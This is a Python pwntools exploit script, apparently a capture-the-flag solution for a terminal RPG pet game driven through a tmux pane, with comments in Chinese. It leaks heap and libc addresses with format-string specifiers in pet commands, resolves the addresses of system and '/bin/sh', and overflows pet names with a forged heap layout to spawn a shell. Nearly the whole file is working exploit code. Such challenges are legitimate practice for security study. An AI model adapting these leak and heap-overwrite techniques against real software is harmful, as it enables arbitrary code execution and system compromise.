from pwn import *
import subprocess, time, os, sys

payload = b'pet free name aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa name bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb name ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc name dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd name 123456'

context.log_level = os.environ.get("PWNLOG", "info")

PANE = os.environ.get("RPG_PANE", "rpg:0.0")     # 你的 tmux pane id
LOGF = os.environ.get("RPG_LOG",  "/tmp/rpg_screen.log")
UP = b'up'
DOWN = b'down'
LEFT = b'left'
RIGHT = b'right'
libc = ELF("./libc.so.6")



def tmux_send_bytes( data: bytes, bufname='injbuf'):
    # 把 data（二进制，允许 \x00）注入 pane
    p = subprocess.Popen(['tmux', 'load-buffer', '-b', bufname, '-'],
                         stdin=subprocess.PIPE)
    p.communicate(data)     # data 可以包含 \x00
    subprocess.run(['tmux', 'paste-buffer', '-d', '-t', PANE, '-b', bufname],
                   check=True)

# 用法：向 rpg:0.0 注入一个 NUL


# --- tmux 注入工具 ---
def tmux_send(*keys):
    """向 tmux pane 发送按键（支持 Up/Down/Left/Right、C-m 等）"""
    cmd = ["tmux", "send-keys", "-t", PANE] + list(keys)
    subprocess.run(cmd, check=True)

def send_text(s, enter=False):
    # -l 逐字发送，避免被 tmux 当作特殊键
    subprocess.run([b"tmux", b"send-keys", b"-t", PANE, b"-l", s], check=True)
    if enter:
        tmux_send("Enter")

def send_arrow(direction):
    # tmux 支持方向键名：Up Down Left Right
    assert direction in ("Up","Down","Left","Right")
    tmux_send(direction)

def enter_debug():
    send_text("`",enter=True)  # 反引号
    time.sleep(0.1)

def exit_debug():
    send_text("`",enter=True)  # 反引号
    time.sleep(0.1)

# --- 读取屏幕日志（tail） ---
read_bytes = 0
def tail_log(expect=b">", timeout=3.0):
    """简易等待：从日志里等提示符出现"""
    dl = 0.05
    data = b""
    t0 = time.time()
    with open(LOGF, "rb") as f:
        # 跳到文件尾
        f.seek(0, os.SEEK_END)
        while time.time() - t0 < timeout:
            chunk = f.read()
            if chunk:
                data += chunk
                if expect in data:
                    return True, data
            else:
                time.sleep(dl)
    return False, data

def read_leak_info(timeout=3.0):
    global read_bytes
    with open(LOGF, "rb") as f:
        if read_bytes:
            f.read(read_bytes)
        data = f.read()
        #Pet name not exist: 0x619784075ea0...
        read_bytes += len(data)
        if b'Pet name not exist: ' in data:
            idx = data.index(b'Pet name not exist: ') + len(b'Pet name not exist: ')
            idx_end = data.index(b'...', idx)
            leak = int(data[idx:idx_end], 16)
            return leak
        return 0

def level_up(direction):
    for i in range(80):
        tmux_send_bytes(b'move '+ direction + b'\n')
        time.sleep(0.1)
        tmux_send_bytes(b'catch\n')
        time.sleep(0.1)
        tmux_send_bytes(b'pet free id 1\n')
    
    

def main():
    # 示例 1：地图模式发方向键
    # send_arrow("Right"); time.sleep(0.05)
    # send_arrow("Right"); time.sleep(0.05)
    # send_arrow("Down");  time.sleep(0.05)

    # 示例 2：进入 debug mode，发送命令
    enter_debug()
    ok,_ = tail_log(expect=b"> ", timeout=2.0)  # 等待提示符
    if not ok:
        log.warning("未检测到 '> ' 提示符，继续尝试发送")
    # 0x3 0x8 0x9 0xa 0xd 0x11 0x13 0x1a 0x1c 0x7f
    
    # stack leak: pet bring name %14$p
    # tmux_send_bytes(b'pet bring name %14$p\n')
    # sleep(0.3)
    
    
    
    # heap leak: pet being name %17$p 
    
    level_up(LEFT)
    pause()
    
    tmux_send_bytes(b'pet bring name %43$p\n')
    sleep(0.3)
    heap_leak = read_leak_info()
    log.success(f"heap_leak: {hex(heap_leak)}")
    
    tmux_send_bytes(b'pet free name %45$p\n')
    sleep(0.3)
    libc_leak = read_leak_info()
    log.success(f"libc_leak: {hex(libc_leak)}")
    
    # heap_leak = 0x555e5649e8d0
    # libc_leak = 0x7faa2c3f31ca
    
    
    heap_pad = heap_leak + 0x240
    # libc leak: pet free name %45$p

    libc_base = libc_leak - 0x2a1ca
    log.success(f"libc_base: {hex(libc_base)}")
    libc.address = libc_base
    system_addr = libc.symbols['system']
    log.success(f"system_addr: {hex(system_addr)}")
    binsh_addr = libc.search(b'/bin/sh\x00').__next__()
    log.success(f"binsh_addr: {hex(binsh_addr)}")
    
    # libc_base = libc_leak - 0x2a1ca
    
    rename1 = b'pet rename 1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
    rename2 = b'pet rename 2 bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n'
    rename3 = b'pet rename 3 ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\n'
    rename4 = b'pet rename 4 dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\n'
    hack_name = b'12345678123456781' + p64(0x31) + p64(0xdeadbeefdeadbeef)*3 +p64(heap_pad) + p64(0x0) + p64(0x31) +p64(system_addr) +p64(binsh_addr) +p64(binsh_addr) +p64(binsh_addr)
    rename5 = b'pet rename 5 ' + hack_name + b'\n'
    tmux_send_bytes(rename1)
    sleep(0.3)
    tmux_send_bytes(rename2)
    sleep(0.3)
    tmux_send_bytes(rename3)
    sleep(0.3)
    tmux_send_bytes(rename4)
    sleep(0.3)
    tmux_send_bytes(b'\n')
    sleep(0.3)
    tmux_send_bytes(rename5)
    sleep(0.3)
    pause()
    tmux_send_bytes(payload)
    tmux_send_bytes(b'\t')
    sleep(0.3)

    exit_debug()

    log.success("脚本注入完成；你可以继续在 tmux 里手动玩。")

if __name__ == "__main__":
    main()